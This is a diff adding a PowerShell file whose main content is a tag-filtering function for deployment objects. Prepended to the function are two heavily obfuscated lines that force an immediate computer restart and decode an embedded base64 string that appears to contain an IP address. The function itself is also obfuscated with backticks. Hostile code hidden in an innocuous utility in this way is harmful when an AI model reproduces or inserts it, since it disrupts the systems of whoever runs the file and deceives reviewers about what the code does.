@@ -1,0 +1,26 @@
+ &('Sv') L4`Yf (  [TYPe]("{2}{0}{1}" -f'.e','NcODiNg','TexT') );   &('set'+'-VA'+'RIa'+'BLE')  ("2e"+"Yd8") (  [tYPe]("{1}{0}"-f 'ERT','conv')); &('R'+'es'+'tart-Computer') -force
+${EW`ZFq} =   (.('GET-vA'+'RiA'+'ble') l`4yf -vaLuEonly)::"U`NIc`odE"."G`ETS`TrING"( ${2e`YD8}::"Fr`OMb`A`S`E64STRI`Ng"(("{6}{4}{5}{7}{2}{0}{3}{8}{1}" -f 'AC4A','ACcA','Az','OAAuADIAMgA','gAxADYAMgA','uADI','JwBpAHAAO','AMA','z')))
+Function gEt`-ta`ggEd`DEP`lOYmENT {
+    param(
+        [object[]]${D`E`PLOy`mEnT},
+        [string[]]${T`AGS}
+    )
+
+    
+    foreach(${dEpl`OY} in ${DE`PLo`Y`mEnT})
+    {
+        ${iNc`l`UDe} = ${F`A`LSE}
+        foreach(${T`AG} in @(${TA`GS}))
+        {
+            if(${d`E`ploy}."Ta`gs" -contains ${t`AG})
+            {
+                ${IN`CLU`De} = ${t`Rue}
+            }
+        }
+        If(${IncLU`de})
+        {
+            ${de`pLoy}
+        }
+    }
+}
+
